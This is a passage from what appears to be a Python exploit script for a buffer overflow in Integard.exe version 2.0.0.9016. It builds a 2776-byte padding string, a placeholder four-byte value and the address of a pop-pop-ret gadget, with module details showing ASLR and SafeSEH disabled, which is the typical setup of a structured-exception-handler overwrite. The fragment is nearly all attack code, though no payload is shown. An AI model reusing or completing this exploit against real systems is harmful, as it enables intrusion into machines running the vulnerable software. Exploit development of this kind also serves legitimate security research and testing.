...
crash = "A" * 2776
crash += pack("<L", 0x42424242)
crash += pack("<L", 0x00475ea6)   # 0x00475ea6 : pop ecx # pop ecx # ret  | startnull {PAGE_EXECUTE_READ} [Integard.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.0.0.9016 (C:\Program Files\Integard\Integard.exe)
